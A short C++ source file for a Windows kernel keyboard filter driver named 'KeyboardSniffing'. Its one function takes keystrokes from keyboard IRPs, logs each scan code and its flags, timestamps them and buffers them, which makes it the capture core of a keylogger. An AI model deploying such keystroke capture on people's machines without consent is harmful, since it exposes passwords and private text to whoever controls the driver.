#include "KeyboardSniffing.h"
#include <ntddkbd.h>
#include <src/utils/logging.h>

void HandleKeyboardResponse(PDEVICE_EXTENSION devExt, PIRP Irp)
{
	ULONG bytes = (ULONG)Irp->IoStatus.Information;
	PUCHAR buf = (PUCHAR)Irp->AssociatedIrp.SystemBuffer;
	PKEYBOARD_INPUT_DATA keyData = (PKEYBOARD_INPUT_DATA)buf;
	ULONG count = bytes / sizeof(KEYBOARD_INPUT_DATA);

	KIRQL old_irql;
	KeAcquireSpinLock(&devExt->BufferLock, &old_irql);
	for (ULONG i = 0; i < count; ++i) {
		log("Key[%lu]: MakeCode=0x%X, Flags=0x%X\n", i, keyData[i].MakeCode, keyData[i].Flags);
		KeyEvent key_data{};
		KeQuerySystemTimePrecise((PLARGE_INTEGER)&key_data.Timestamp);
		key_data.MakeCode = keyData[i].MakeCode;
		key_data.Flags = keyData[i].Flags;
		devExt->KeyEventBuffer.push(key_data);
	}
	KeReleaseSpinLock(&devExt->BufferLock, old_irql);
}
